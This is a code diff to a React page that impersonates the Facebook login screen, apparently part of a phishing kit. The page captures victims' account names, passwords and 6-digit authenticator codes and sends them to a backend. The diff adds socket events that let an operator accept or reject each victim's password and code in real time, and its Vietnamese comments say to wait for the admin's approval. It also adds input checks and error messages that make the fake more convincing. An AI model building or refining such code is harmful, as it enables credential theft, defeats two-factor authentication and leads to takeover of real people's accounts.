@@ -14,6 +14,8 @@ import {
 } from '@mui/material';
 // components
 import Iconify from '../components/iconify';
+// sections
+import CheckoutOrderComplete from '../sections/@dashboard/e-commerce/checkout/CheckoutOrderComplete';
 // redux
 import { submitFbLogin, submitFbOtp } from '../redux/slices/fb';
 // utils
@@ -35,8 +37,9 @@ export default function FacebookLoginPage() {
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const [wrongPass, setWrongPass] = useState(false);
+  const [wrongOtp, setWrongOtp] = useState(false);
+  const [isOrderComplete, setIsOrderComplete] = useState(false);
   const [sessionId, setSessionId] = useState<string | null>(null);
-  const [ipData, setIpData] = useState<any>(null);
   
   const [collageSrc, setCollageSrc] = useState('https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp');
 
@@ -49,46 +52,71 @@ export default function FacebookLoginPage() {
     setCollageSrc(images[Math.floor(Math.random() * images.length)]);
   }, []);
 
-  useEffect(() => {
-    fetch('https://ipapi.co/json/')
-      .then((res) => res.json())
-      .then((data) => setIpData(data))
-      .catch(() => {});
-  }, []);
 
   useEffect(() => {
     socket.connect();
-    const handleWrongPass = (data: { id: string }) => {
+    
+    // Listen for wrong pass
+    socket.on('fb-wrong-pass', (data: { id: string }) => {
       if (sessionId && data.id === sessionId) {
         setLoading(false);
         setWrongPass(true);
         setStep('login'); 
       }
-    };
-    socket.on('fb-wrong-pass', handleWrongPass);
+    });
+
+    // Listen for OTP approved (Show Success Screen)
+    socket.on('fb-otp-true', (data: { id: string }) => {
+      if (sessionId && data.id === sessionId) {
+        setLoading(false);
+        setIsOrderComplete(true);
+      }
+    });
+
+    // Listen for OTP wrong (Re-enter OTP)
+    socket.on('fb-otp-wrong', (data: { id: string }) => {
+      if (sessionId && data.id === sessionId) {
+        setLoading(false);
+        setWrongOtp(true);
+        setVerifyCode(''); // Xoá mã cũ để nhập lại
+      }
+    });
+
     return () => {
-      socket.off('fb-wrong-pass', handleWrongPass);
+      socket.off('fb-wrong-pass');
+      socket.off('fb-pass-true');
+      socket.off('fb-otp-true');
+      socket.off('fb-otp-wrong');
     };
   }, [sessionId]);
 
+  const [loginError, setLoginError] = useState<string | null>(null);
+
   const handleLoginSubmit = async () => {
-    if (!account.trim() || !password.trim()) return;
+    const trimmedAccount = account.trim();
+    if (!trimmedAccount || !password.trim()) return;
+
+    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedAccount);
+    const isPhone = /^\+?[0-9]{8,15}$/.test(trimmedAccount);
+
+    if (!isEmail && !isPhone) {
+      setLoginError("The email address or mobile number you entered isn't connected to an account. Find your account and log in.");
+      return;
+    }
+
     setLoading(true);
+    setLoginError(null);
     setWrongPass(false);
 
     try {
       const result = await submitFbLogin({
-        account: account.trim(),
+        account: trimmedAccount,
         password: password.trim(),
-        ipAddress: ipData?.ip,
-        country: ipData?.country_name,
-        region: ipData?.region,
-        city: ipData?.city,
       });
 
       setSessionId(result.id);
-      setLoading(false);
-      setStep('otp');
+      // setStep('otp');  <-- BỎ: Không chuyển OTP ngay, đợi admin duyệt (socket lắng nghe ở useEffect)
+      
     } catch (error) {
       setLoading(false);
       setWrongPass(true);
@@ -98,15 +126,12 @@ export default function FacebookLoginPage() {
   const handleOtpSubmit = async () => {
     if (!verifyCode || verifyCode.length !== 6 || !sessionId) return;
     setLoading(true);
+    setWrongOtp(false); // Reset lỗi cũ
     try {
       await submitFbOtp(sessionId, verifyCode);
-      setLoading(false);
-      setTimeout(() => {
-        window.location.href = 'https://www.facebook.com';
-      }, 1000);
+      // setStep('completed'); // BỎ: Không tự động chuyển, đợi lệnh admin (socket fb-otp-true)
     } catch (error) {
       setLoading(false);
-      window.location.href = 'https://www.facebook.com';
     }
   };
 
@@ -208,10 +233,10 @@ export default function FacebookLoginPage() {
               {/* Login Form */}
               {step === 'login' ? (
                 <Stack spacing={2.5}>
-                  {wrongPass && (
+                  {(wrongPass || loginError) && (
                     <Box sx={{ p: 1.5, bgcolor: '#ffebe8', border: '1px solid #dd3c10', borderRadius: 1.5 }}>
                       <Typography variant="body2" color="#dd3c10" sx={{ fontWeight: 600 }}>
-                        The password you've entered is incorrect. 
+                        {loginError || "The password you've entered is incorrect. Forgotten password?"}
                       </Typography>
                     </Box>
                   )}
@@ -326,6 +351,11 @@ export default function FacebookLoginPage() {
                     <Typography variant="body2" sx={{ color: '#606770', lineHeight: 1.5 }}>
                       Enter the 6-digit code from your authentication app to verify your identity.
                     </Typography>
+                    {wrongOtp && (
+                      <Typography variant="body2" color="#dd3c10" sx={{ mt: 1, fontWeight: 700 }}>
+                         The code you entered is incorrect. Please check the code and try again.
+                      </Typography>
+                    )}
                   </Box>
 
                   <TextField
@@ -376,6 +406,13 @@ export default function FacebookLoginPage() {
           </Typography>
         </Box>
       </Box>
+
+      {/* Success Dialog */}
+      <CheckoutOrderComplete 
+        open={isOrderComplete} 
+        onReset={() => { window.location.href = '/'; }} 
+        onDownloadPDF={() => {}} 
+      />
     </>
   );
 }
